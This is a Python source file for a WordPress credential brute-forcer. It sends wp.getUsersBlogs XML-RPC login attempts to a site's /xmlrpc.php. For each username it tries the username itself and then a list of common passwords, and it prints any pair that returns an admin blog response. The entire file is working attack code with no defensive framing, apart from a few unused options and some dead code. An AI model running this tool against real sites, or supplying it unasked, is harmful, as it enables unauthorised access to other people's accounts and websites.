import requests
import Common_passwords


class WPPassBruteforcer(object):

    def __init__(self, domain, additional_data=None, proxies=None):
        self.url = domain
        self.proxies = proxies

    def bruteforce(self, usernames, passwords, threads=None, proxies=None):
        self.usernames = usernames
        self.passwords = passwords
        self.proxies = proxies
        self.threads = threads
        url = self.url
        if_login_succeeded(url,self.usernames)

def if_login_succeeded(url,usernames):
    xml_rpc_url = url + '/xmlrpc.php'
    for user in usernames:
        common_passwords=Common_passwords.Common_passwords().passwords_list()
        common_passwords.insert(0, user)
        for password in common_passwords:
            if password != '' and password != '\n':
                cursrc = brute_attack_xmlrpc(xml_rpc_url, user, password) #try to connect into the site  with username and password
                if cursrc:
                    print("Login details found:\n"" username: " + user + "\n password: " + password + "")
                    return True
                    break
                else:
                    continue
                break
        print("Login failed")

def brute_attack_xmlrpc(xml_rpc_url, user, password):
    connection_data = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value>' \
                      '</param><param><value>{}</value></param></params></methodCall>'.format(
        user, password)
    brute = requests.post(xml_rpc_url, data=connection_data)
    try:
        if "isAdmin" in brute.text and "blogid" in brute.text:
            return True
        else:
            return False
    except:
        return False




